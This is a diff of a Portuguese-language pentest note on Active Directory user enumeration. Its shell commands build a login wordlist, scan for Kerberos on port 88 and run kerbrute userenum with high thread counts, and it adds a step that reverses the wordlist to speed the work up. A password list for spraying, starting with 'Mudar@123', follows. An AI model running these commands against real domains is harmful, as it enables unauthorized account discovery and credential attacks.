@@ -29,18 +29,23 @@ Smaug@erebor:~$ python3 namemash.py name_and_surname.txt >> wordlist_login_pt_br
 Smaug@erebor:~$ nmap -p88 192.168.0.1/24 --open
 Smaug@erebor:~$ git clone https://github.com/ropnop/kerbrute; cd kerbrute
 Smaug@erebor:~$ go build .
-Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL wordlist_login_pt_br.txt
+Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL wordlist_login_pt_br.txt -t 200
 ```
 #  
 ![evidence](img/img.png)  
 #  
-##### Checkpoint:  
+## Checkpoint:  
 ```
 Smaug@erebor:~$ cat wordlist_login_pt_br.txt |nl |grep beatriz.araujo
 Smaug@erebor:~$ cat wordlist_login_pt_br.txt |tail -n $(($(wc -l wordlist_login_pt_br.txt | cut -d " " -f 1)-366773)) >> tmp
 Smaug@erebor:~$ mv tmp wordlist_login_pt_br.txt
 ```
-
+## Acelerando o processo:  
+```
+Smaug@erebor:~$ tac wordlist_login_pt_br.txt > w.txt
+Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL wordlist_login_pt_br.txt -t 200
+Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL w.txt -t 200
+```
 #### pass.txt:  
 ```
 Mudar@123
